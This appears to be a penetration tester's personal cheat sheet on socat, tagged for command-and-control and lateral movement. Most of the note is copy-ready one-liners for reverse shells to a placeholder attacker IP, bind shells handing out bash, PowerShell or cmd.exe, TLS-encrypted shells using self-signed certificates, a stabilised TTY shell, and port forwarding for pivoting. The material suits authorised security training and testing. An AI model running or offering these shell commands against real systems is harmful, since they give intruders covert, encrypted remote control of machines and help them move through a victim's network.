---
tags:
  - "#type/tool"
  - "#attack/command-and-control"
  - "#attack/lateral-movement"
Link: https://www.redhat.com/sysadmin/getting-started-socat
Purpose: sophisticated reverse shell
---
# Info

sophisticated reverse shell tool, however, special payload is required for connection

static binary: <https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat>

# Usage

#todo

| Option            | Purpose                                                                                                  |
| ----------------- | -------------------------------------------------------------------------------------------------------- |
| `,crlf`           | send crlf sequences (e.g. useful for smtp)                                                               |
| `EXEC:"bash -li"` | interactive shell                                                                                        |
| `pty`             | allocates a pseudoterminal on the target -- part of the stabilisation process                            |
| `stderr`          | makes sure that any error messages get shown in the shell (often a problem with non-interactive shells)  |
| `sigint`          | passes any Ctrl + C commands through into the sub-process, allowing us to kill commands inside the shell |
| `setsid`          | creates the process in a new session                                                                     |
| `sane`            | stabilises the terminal, attempting to "normalise" it.                                                   |
| `pipes`           | force windows to use unix style pipes                                                                    |
| `-ddd`            | verbose                                                                                                  |

# Snippets

## Reverse Shell

- start socat listener: `socat TCP-L:<port> -`
- connect to listener:
	- Windows: `socat TCP:<ip>:<port> EXEC:powershell.exe,pipes`
	- Linux: `socat TCP:<ip>:<port> EXEC:"bash -li"`

### Linux: Stable Reverse Shell

- start istener: `socat TCP-L:<port> FILE:tty,raw,echo=0`
	- to this listener, you can only connect with a special socat payload, which has to be downloaded to the target machine first.
- connect to listener: `socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane`

## Bind Shell

- connect to listener:
	- Linux: `socat TCP-L:<PORT> EXEC:"bash -li"`
	- Windows:`socat TCP-L:<PORT> EXEC:powershell.exe,pipes`
- on attacker: `socat TCP:<TARGET-IP>:<TARGET-PORT> -`

## Encrypted Shell

**Setup**

1. generate private key and certificate (on attacking machine):
	- `openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt`
2. merge the two file into a single -pem file:
	- `cat shell.key shell.crt > shell.pem`
	- the pem file will be used by the listener

**Reverse shell**

- setup listener
	- `socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -`
- connect from target
	- `socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:"bash -li"`

**Bind shell**

1. copy .pem file to target
2. setup listener on target:
	- `socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes`
3. connect from attacker:
	- `socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 -`

**Notes:** this can be combined with the "tty method" for linux targets by inserting ``FILE:`tty`,raw,echo=0`` in the listener and `,pty,stderr,sigint,setsid,sane` in the connector (insert both in the second argument)

# Port Forwarding

`socat -ddd TCP-LISTEN:<listener_port>,fork TCP:<forward_ip>:<forward_port>`

**This will:**
- listen on TCP port `<listener_port`
- fork into a new subprocess when it receives a connection (instead of dying after a single connection)
- forward all traffic it receives to `<forward_ip>:<forward_port>`
